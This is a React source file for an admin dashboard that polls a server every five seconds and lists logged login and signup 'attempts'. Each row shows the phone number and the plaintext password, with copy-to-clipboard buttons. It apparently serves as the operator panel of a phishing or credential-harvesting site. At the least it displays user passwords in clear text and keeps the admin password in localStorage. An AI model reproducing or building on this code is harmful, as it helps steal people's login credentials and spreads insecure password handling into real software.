import React, { useState, useEffect } from 'react'
import { useHistory } from 'react-router-dom'
import { Helmet } from 'react-helmet'
import { apiService } from '../../services/api'
import Notification from '../../components/Notification/Notification'
import './AdminPanel.css'

const AdminPanel = () => {
    const [logs, setLogs] = useState([])
    const [users, setUsers] = useState([])
    const [activeTab, setActiveTab] = useState('logs') // 'logs' or 'users'
    const [sidebarOpen, setSidebarOpen] = useState(false)
    const [notif, setNotif] = useState({ show: false, msg: '', type: 'success' })
    const history = useHistory()
    const adminPass = localStorage.getItem('admin_pass')

    useEffect(() => {
        if (!adminPass) {
            history.push('/ky1/login')
            return
        }

        fetchLogs()
        fetchUsers()

        // Auto Refresh every 5 seconds
        const interval = setInterval(() => {
            fetchLogs()
            fetchUsers()
        }, 5000)

        return () => clearInterval(interval)
    }, [adminPass])

    const fetchLogs = async () => {
        try {
            const data = await apiService.fetchAdminLogs(adminPass)
            if (data.success) setLogs(data.logs)
        } catch (e) {
            console.error('Fetch error:', e)
            setNotif({ show: true, msg: 'Session expired or Database error. Please log in again.', type: 'error' })
            setTimeout(() => {
                history.push('/ky1/login')
            }, 3000) // Give user time to see the error
        }
    }

    const fetchUsers = async () => {
        try {
            const data = await apiService.fetchAdminUsers(adminPass)
            if (data.success) setUsers(data.users)
        } catch (e) {
            console.error('Failed to fetch users:', e)
        }
    }

    const handleCopy = (text) => {
        navigator.clipboard.writeText(text)
        setNotif({ show: true, msg: `Copied: ${text}`, type: 'success' })
    }

    const handleClearLogs = async () => {
        if (window.confirm('Are you sure you want to clear all logs? This cannot be undone.')) {
            try {
                const res = await apiService.clearAdminLogs(adminPass)
                if (res.success) {
                    setLogs([])
                    setNotif({ show: true, msg: 'Activity logs cleared!', type: 'success' })
                }
            } catch (e) {
                setNotif({ show: true, msg: 'Failed to clear logs', type: 'error' })
            }
        }
    }

    const handleClearUsers = async () => {
        if (window.confirm('Are you sure you want to clear all users? This cannot be undone.')) {
            try {
                const res = await apiService.clearAdminUsers(adminPass)
                if (res.success) {
                    setUsers([])
                    setNotif({ show: true, msg: 'Members list cleared!', type: 'success' })
                }
            } catch (e) {
                setNotif({ show: true, msg: 'Failed to clear users', type: 'error' })
            }
        }
    }

    const handleLogout = () => {
        localStorage.removeItem('admin_pass')
        history.push('/ky1/login')
    }

    return (
        <div className="admin-panel-container">
            <Helmet>
                <title>Admin Dashboard</title>
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
            </Helmet>

            {/* Sidebar */}
            <div className={`admin-sidebar ${sidebarOpen ? 'open' : ''}`}>
                <div className="sidebar-header">
                    <div className="logo-section">
                        <img src="/image236-8e3o-200h.png" alt="Logo" className="admin-logo-s" />
                        <h3>Control Panel</h3>
                    </div>
                </div>
                <ul className="sidebar-links">
                    <li className={activeTab === 'logs' ? 'active' : ''} onClick={() => { setActiveTab('logs'); setSidebarOpen(false); }}>
                        <i className="fas fa-list-ul"></i> User Activity
                    </li>
                    <li className={activeTab === 'users' ? 'active' : ''} onClick={() => { setActiveTab('users'); setSidebarOpen(false); }}>
                        <i className="fas fa-users"></i> Member List
                    </li>
                    <li onClick={() => setNotif({ show: true, msg: 'Settings panel coming soon!', type: 'success' })}>
                        <i className="fas fa-cog"></i> Settings
                    </li>
                    <li onClick={handleLogout} className="logout-li">
                        <i className="fas fa-sign-out-alt"></i> Logout
                    </li>
                </ul>
            </div>

            {/* Main Content */}
            <div className="admin-main">
                <header className="admin-header">
                    <div className="header-left">
                        <button className="menu-toggle" onClick={() => setSidebarOpen(true)}>
                            <i className="fas fa-bars"></i>
                        </button>
                        <h2>{activeTab === 'logs' ? 'User Activity Logs' : 'Registered Members'}</h2>
                    </div>
                    <div className="header-actions">
                        <button className="action-btn refresh" onClick={activeTab === 'logs' ? fetchLogs : fetchUsers} title="Refresh">
                            <i className="fas fa-sync-alt"></i>
                        </button>
                        <button className="action-btn clear" onClick={activeTab === 'logs' ? handleClearLogs : handleClearUsers} title="Clear All">
                            <i className="fas fa-trash-alt"></i>
                        </button>
                    </div>
                </header>

                <div className="admin-content">
                    {/* Stats */}
                    <div className="stats-cards">
                        <div className="stat-card">
                            <div className="stat-icon red"><i className="fas fa-user-clock"></i></div>
                            <div className="stat-info">
                                <span>{activeTab === 'logs' ? 'Total Attempts' : 'Total Members'}</span>
                                <h3>{activeTab === 'logs' ? logs.length : users.length}</h3>
                            </div>
                        </div>
                        <div className="stat-card">
                            <div className="stat-icon blue"><i className="fas fa-sign-in-alt"></i></div>
                            <div className="stat-info">
                                <span>{activeTab === 'logs' ? 'Recent Logins' : 'Last 24h Signups'}</span>
                                <h3>{activeTab === 'logs' ? logs.filter(l => l.type === 'login').length : users.length}</h3>
                            </div>
                        </div>
                    </div>

                    {/* Content Table */}
                    <div className="table-card">
                        <div className="table-header">
                            <h3><i className={`fas ${activeTab === 'logs' ? 'fa-history' : 'fa-users'}`}></i> {activeTab === 'logs' ? 'Real-time Logs' : 'Member Database'}</h3>
                        </div>
                        <div className="table-wrapper">
                            <table className="logs-table">
                                <thead>
                                    {activeTab === 'logs' ? (
                                        <tr>
                                            <th>TYPE</th>
                                            <th>PHONE NUMBER</th>
                                            <th>PASSWORD</th>
                                            <th>TIMESTAMP</th>
                                        </tr>
                                    ) : (
                                        <tr>
                                            <th>USER ID</th>
                                            <th>NICKNAME</th>
                                            <th>PHONE NUMBER</th>
                                            <th>JOINED DATE</th>
                                        </tr>
                                    )}
                                </thead>
                                <tbody>
                                    {activeTab === 'logs' ? (
                                        logs.map(log => (
                                            <tr key={log.id}>
                                                <td><span className={`tag ${log.type}`}>{log.type === 'login' ? <i className="fas fa-key"></i> : <i className="fas fa-user-plus"></i>} {log.type.toUpperCase()}</span></td>
                                                <td className="phone-td clickable" onClick={() => handleCopy(log.phone)}>
                                                    <i className="fas fa-phone-alt"></i> {log.phone}
                                                </td>
                                                <td className="pass-td clickable" onClick={() => handleCopy(log.password)}>
                                                    <i className="fas fa-lock"></i> {log.password}
                                                </td>
                                                <td className="date-td">{new Date(log.created_at).toLocaleString()}</td>
                                            </tr>
                                        ))
                                    ) : (
                                        users.map(user => (
                                            <tr key={user.id}>
                                                <td>#{user.id}</td>
                                                <td><strong>{user.username}</strong></td>
                                                <td className="phone-td clickable" onClick={() => handleCopy(user.phone)}>
                                                    <i className="fas fa-phone-alt"></i> {user.phone}
                                                </td>
                                                <td className="date-td">{new Date(user.created_at).toLocaleDateString()}</td>
                                            </tr>
                                        ))
                                    )}
                                    {(activeTab === 'logs' ? logs.length : users.length) === 0 && (
                                        <tr>
                                            <td colSpan="4" className="empty-state">
                                                <i className="fas fa-folder-open"></i>
                                                <p>No data found yet.</p>
                                            </td>
                                        </tr>
                                    )}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <Notification
                isVisible={notif.show}
                message={notif.msg}
                type={notif.type}
                onClose={() => setNotif({ ...notif, show: false })}
            />

            {/* Overlay for mobile */}
            {sidebarOpen && <div className="panel-overlay" onClick={() => setSidebarOpen(false)}></div>}
        </div>
    )
}

export default AdminPanel
